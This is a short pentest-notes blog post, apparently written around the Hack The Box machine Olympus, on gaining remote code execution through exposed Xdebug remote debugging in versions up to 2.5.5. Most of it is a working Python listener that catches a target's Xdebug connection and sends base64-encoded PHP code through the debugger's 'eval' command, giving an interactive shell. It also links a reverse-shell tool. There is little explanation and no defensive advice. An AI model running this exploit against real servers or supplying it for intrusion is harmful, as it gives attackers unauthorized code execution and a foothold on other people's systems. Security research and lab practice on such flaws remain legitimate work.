---
layout: post
title: PHP XDebug
description: PHP XDebug
summary: PHP XDebug
tags: [php,rce,foothold]
minute: 1
---
## Overview
Xdebug is a PHP debugging tool that supports remote debugging of PHP code on the server through source code locally. Xdebug has powerful functions, and there have been many articles about its configuration recently. The idea of digging the attack surface of Xdebug was born a long time ago, and finally I did it today, a day suitable for paddling.

## Vulnerable Versions
* <= 2.5.5

## Example Exploit Scripts
```python
#!/usr/bin/python2
import socket

ip_port = ('0.0.0.0',9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = raw_input('>> ')
    conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
```

* [GitHub - gteissier/xdebug-shell: xdebug reverse shell](https://github.com/gteissier/xdebug-shell)

## Alternatives
* You can use [chrome](https://www.youtube.com/watch?v=7ifJOon5-G8&t=587s) also to exploit this

## References
* HTB Olympus
* https://paper.seebug.org/397/
* [The Exploits of Xdebug in PhpStorm](https://medium.com/@knownsec404team/the-exploits-of-xdebug-in-phpstorm-2ca140e91dc)
